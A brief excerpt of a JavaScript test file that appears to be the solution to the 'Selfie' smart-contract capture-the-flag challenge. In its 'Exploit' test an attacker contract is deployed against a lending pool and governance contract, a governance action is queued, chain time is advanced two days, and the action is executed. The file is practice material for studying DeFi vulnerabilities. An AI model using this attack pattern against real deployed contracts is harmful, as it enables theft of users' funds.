...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        this.selfiePoolAttack = await SelfiePoolAttackFactory.connect(attacker).deploy(this.pool.address, this.governance.address);
        await this.selfiePoolAttack.start();
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
        await this.selfiePoolAttack.execute();
    });
